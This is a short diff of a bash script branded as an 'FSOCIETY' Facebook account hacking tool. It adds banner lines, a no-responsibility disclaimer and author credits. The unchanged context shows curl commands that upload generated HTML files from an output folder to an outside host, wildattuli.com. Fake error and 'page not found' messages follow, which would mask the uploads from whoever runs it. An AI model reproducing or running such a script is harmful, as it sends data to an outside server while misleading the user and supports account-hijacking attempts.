@@ -7,7 +7,11 @@ sleep 0.1
 clear
 (( count++ ))
 done
-echo "[+] The FSOCIETY -- Facebook Account Moussa [+]";
+echo "[+] The FSOCIETY -- Facebook Account Moussa  ⌛ [+]";
+echo ' ⌛ We are not responsible for any harmful use to society ☢        ';
+echo '  [+] Respect your decision if you do not want to talk ♿  ☣        ';
+echo '⌛ Author ➤ MOUSSA ➤ ❰ Team FSOCIETY-ARAB ❱⚖❴ Algeria thelead❵ ';
+echo '    ⌛ ♡ ♡ ♡ Condition is good ⌛ Algeria ☪ Telecom ☎  ☛  ✖ ✗       ';
 echo '   _____   _____   _____   _____   _   _____   _____  __    __ ';
 echo '  |  ___| /  ___/ /  _  \ /  ___| | | | ____| |_   _| \ \  / / ';
 echo '  | |__   | |___  | | | | | |     | | | |__     | |    \ \/ /  ';
@@ -50,4 +54,4 @@ curl -T output/fuck9.html http://wildattuli.com
 curl -T output/fuck0.html http://wildattuli.com
 echo '[+] ERROR RETRY ACCESS ERROR!';
 echo '!!! ⚠ PAGE NOT FOUND ⚠  !!!';
-echo '!!! ⚠ ERROR error ERROR error ERROR ⚠ !!!';
+echo '!!! ⚠ ERROR error ERROR error ERROR ⚠ !!!';;
